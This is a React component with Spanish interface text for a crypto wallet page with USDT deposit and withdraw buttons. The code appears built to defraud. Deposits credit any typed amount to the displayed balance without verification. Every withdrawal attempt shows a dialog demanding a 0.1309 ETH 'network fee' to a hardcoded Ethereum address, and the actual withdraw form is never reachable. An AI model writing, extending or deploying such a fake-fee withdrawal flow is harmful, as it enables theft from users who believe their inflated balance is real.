import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { Wallet, ArrowDown, ArrowUp, Copy, Check, ArrowLeft } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { toast } from '@/components/ui/use-toast';
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";


const WalletSection = ({ userBalance, setUserBalance, addTransaction }) => {
  const [modalType, setModalType] = useState(null);
  const [amount, setAmount] = useState('');
  const [address, setAddress] = useState('');
  const [showWithdrawForm, setShowWithdrawForm] = useState(false);

  const depositAddress = '0xAbCd...1234';
  const requiredEthDepositAddress = '0x89c945bb39841D7aaDae972261790a949E071E2f';
  const [copied, setCopied] = useState(false);

  const handleCopy = (addr) => {
    navigator.clipboard.writeText(addr);
    setCopied(true);
    toast({ title: "📋 Dirección copiada" });
    setTimeout(() => setCopied(false), 2000);
  };

  const handleDeposit = () => {
    const depositAmount = parseFloat(amount);
    if (!depositAmount || depositAmount <= 0) {
      toast({ title: "❌ Cantidad inválida", description: "Ingresa una cantidad válida para depositar." });
      return;
    }
    setUserBalance(prev => ({ ...prev, usdt: prev.usdt + depositAmount }));
    addTransaction({
      id: new Date().toISOString(),
      type: 'Depósito',
      amount: `+${depositAmount.toFixed(2)} USDT`,
      project: 'Desde Wallet',
      date: new Date().toLocaleDateString(),
      status: 'completed'
    });
    toast({ title: "✅ Depósito Confirmado", description: `${depositAmount} USDT han sido añadidos a tu cartera.` });
    setModalType(null);
    setAmount('');
  };

  const handleAttemptWithdraw = () => {
    setModalType('withdraw');
  };

  const handleWithdraw = () => {
    const withdrawAmount = parseFloat(amount);
    if (!withdrawAmount || withdrawAmount <= 0) {
      toast({ title: "❌ Cantidad inválida", description: "Ingresa una cantidad válida para retirar." });
      return;
    }
    if (withdrawAmount > userBalance.usdt) {
      toast({ title: "saldo insuficiente", description: "No tienes suficiente USDT para este retiro." });
      return;
    }
    if (!address) {
      toast({ title: "❌ Dirección inválida", description: "Por favor, ingresa una dirección de retiro válida." });
      return;
    }
    
    setUserBalance(prev => ({ ...prev, usdt: prev.usdt - withdrawAmount }));
    addTransaction({
      id: new Date().toISOString(),
      type: 'Retiro',
      amount: `-${withdrawAmount.toFixed(2)} USDT`,
      project: `A ${address.slice(0,6)}...`,
      date: new Date().toLocaleDateString(),
      status: 'pending'
    });
    toast({ title: "⏳ Retiro en Proceso", description: `Tu retiro de ${withdrawAmount} USDT a ${address.slice(0, 6)}... está siendo procesado.` });
    setShowWithdrawForm(false);
    setAmount('');
    setAddress('');
  };

  const renderModal = () => {
    if (!modalType) return null;

    if (modalType === 'deposit') {
      return (
        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4" onClick={() => setModalType(null)}>
          <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="glass-card p-6 rounded-2xl max-w-sm w-full" onClick={(e) => e.stopPropagation()}>
            <h3 className="text-xl font-bold text-center mb-4">Depositar USDT</h3>
            <p className="text-sm text-gray-400 text-center mb-4">Envía USDT (ERC-20/TRC-20) a la siguiente dirección para recargar tu cartera.</p>
            <div className="bg-gray-800/50 p-3 rounded-lg text-center mb-4">
              <p className="font-mono text-green-400 break-words">{depositAddress}</p>
            </div>
            <Button onClick={() => handleCopy(depositAddress)} className="w-full mb-4">
              {copied ? <Check className="w-4 h-4 mr-2" /> : <Copy className="w-4 h-4 mr-2" />}
              {copied ? 'Copiado' : 'Copiar Dirección'}
            </Button>
            <p className="text-sm text-gray-400 mb-2">Una vez enviado, confirma tu depósito aquí:</p>
            <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="Cantidad Depositada" className="w-full p-3 bg-gray-800/50 border border-gray-600 rounded-lg text-white mb-4" />
            <div className="flex space-x-3">
              <Button variant="outline" className="flex-1 border-gray-600" onClick={() => setModalType(null)}>Cancelar</Button>
              <Button className="flex-1 bg-green-500 hover:bg-green-600" onClick={handleDeposit}>Confirmar Depósito</Button>
            </div>
          </motion.div>
        </motion.div>
      );
    }

    if (modalType === 'withdraw') {
      if (showWithdrawForm) {
        return (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="fixed inset-0 bg-black/50 backdrop-blur-sm z-50 flex items-center justify-center p-4" onClick={() => {setShowWithdrawForm(false); setModalType(null)}}>
            <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="glass-card p-6 rounded-2xl max-w-sm w-full" onClick={(e) => e.stopPropagation()}>
              <Button variant="ghost" size="sm" className="absolute top-3 left-3" onClick={() => setShowWithdrawForm(false)}><ArrowLeft className="w-4 h-4 mr-1" /> Volver</Button>
              <h3 className="text-xl font-bold text-center mb-4 pt-8">Retirar USDT</h3>
              <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="Cantidad a Retirar" className="w-full p-3 bg-gray-800/50 border border-gray-600 rounded-lg text-white mb-4" />
              <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} placeholder="Dirección de Wallet (ERC-20)" className="w-full p-3 bg-gray-800/50 border border-gray-600 rounded-lg text-white mb-4" />
              <Button className="w-full bg-blue-500 hover:bg-blue-600" onClick={handleWithdraw}>Confirmar Retiro</Button>
            </motion.div>
          </motion.div>
        )
      }
      return (
        <AlertDialog open={modalType === 'withdraw' && !showWithdrawForm} onOpenChange={() => setModalType(null)}>
          <AlertDialogContent>
            <AlertDialogHeader>
              <AlertDialogTitle>Comisión de Retiro</AlertDialogTitle>
              <AlertDialogDescription>
                Para procesar su retiro, se requiere una comisión de red. Por favor, deposite 0.1309 ETH en la siguiente dirección para cubrir los costos de transacción.
              </AlertDialogDescription>
            </AlertDialogHeader>
            <div className="bg-gray-800/50 p-3 rounded-lg text-center my-4">
              <p className="font-mono text-purple-400 break-words">{requiredEthDepositAddress}</p>
            </div>
            <AlertDialogFooter>
              <AlertDialogCancel onClick={() => setModalType(null)}>Volver</AlertDialogCancel>
              <AlertDialogAction onClick={() => handleCopy(requiredEthDepositAddress)} className="bg-purple-500 hover:bg-purple-600">
                {copied ? <Check className="w-4 h-4 mr-2" /> : <Copy className="w-4 h-4 mr-2" />}
                Copiar Dirección
              </AlertDialogAction>
            </AlertDialogFooter>
          </AlertDialogContent>
        </AlertDialog>
      );
    }
  };

  return (
    <div className="p-4 space-y-6">
      <motion.div initial={{ opacity: 0, y: -20 }} animate={{ opacity: 1, y: 0 }} className="text-center space-y-2">
        <h1 className="text-2xl font-bold">Cartera</h1>
        <p className="text-gray-400">Gestiona tus fondos de forma segura.</p>
      </motion.div>

      <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }} className="glass-card p-6 rounded-2xl text-center">
        <Wallet className="w-8 h-8 mx-auto text-green-400 mb-2" />
        <p className="text-sm text-gray-400">Balance Principal (USDT)</p>
        <p className="text-4xl font-bold neon-text">{userBalance.usdt.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
      </motion.div>

      <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.2 }} className="grid grid-cols-2 gap-4">
        <Button onClick={() => setModalType('deposit')} className="h-14 bg-green-500/20 text-green-400 hover:bg-green-500/30 rounded-xl flex-col">
          <ArrowDown className="w-6 h-6 mb-1" />
          Depositar
        </Button>
        <Button onClick={handleAttemptWithdraw} className="h-14 bg-blue-500/20 text-blue-400 hover:bg-blue-500/30 rounded-xl flex-col">
          <ArrowUp className="w-6 h-6 mb-1" />
          Retirar
        </Button>
      </motion.div>
      
      {renderModal()}
    </div>
  );
};

export default WalletSection;